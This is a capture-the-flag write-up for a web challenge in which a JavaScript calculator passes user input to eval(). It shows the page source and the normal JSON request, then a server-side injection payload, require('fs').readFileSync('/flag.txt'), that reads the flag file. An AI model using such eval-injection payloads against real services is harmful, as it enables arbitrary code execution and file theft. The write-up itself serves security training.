# jscalc

## Description
```
In the mysterious depths of the digital sea, a specialized JavaScript calculator has been crafted by tech-savvy squids. 
With multiple arms and complex problem-solving skills, these cephalopod engineers use it for everything from inkjet trajectory calculations to deep-sea math. 
Attempt to outsmart it at your own risk! 🦑
```

## Writeup

Starting off I took a loo kat the website. <br/>
```html
<html>
<head>
    <title>🦑calc 0.1</title>
    <link rel="icon" type="image/png" href="/static/favicon.png">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
    <link rel="stylesheet" href="/static/css/main.css">
</head>
<body>
    <nav class="navbar navbar-expand-lg navbar-dark bg-primary mb-4">
        <a class="navbar-brand mb-0 h1" href="/">🦑calc</a>
    </nav>
    <div class="container">
        <div class="card">
            <div class="card-body">
                <div class="card-text">
                    <center><h3>A super secure Javascript calculator with the help of <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval"><b>eval()</b></b></a>  🤮</h3></center>
                </div>
                <br>
                <form class='form' role='form' id='form'>
                    <div class="input-group">
                        <input type="text" id="formula" name="formula" class="form-control" value="100*10-3+340" placeholder="100*10-3+340">
                    </div>
                    <button type='submit' class='btn-lg btn-block btn-danger'>Calculate</button>
                    <br>
                </form>
                <div id='output'></div>
                <div id='alerts'></div>
            </div>
        </div>
    </div>
</body>
<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
<script src='/static/js/main.js' type='text/javascript'></script>
</html>
```

Sending a request it seems like this is our normal json payload: <br/>
```json
{"formula":"1 + 1"}
```

Using this we get the following response body: <br/>
```json
{"message":2}
```

Also looking at the html we see a link to `eval()` a javascript function which has some vulnerabilities and may allow arbitrary code execution. <br/>
Knowing that we may inject malicious code we can code a payload. <br/>

Trying out the following one-liner payload: <br/>
```json
{"formula":"require('fs').readFileSync('/flag.txt').toString();"}
```

This basically imports `fs` to read files and than proceeds to read `/flag.txt`, the last step is to convert it to string so it can be successfully returned. <br/>

Sending the payload we actually obtain the flag. <br/>
```json
{"message":"HTB{REDACTED}"}
```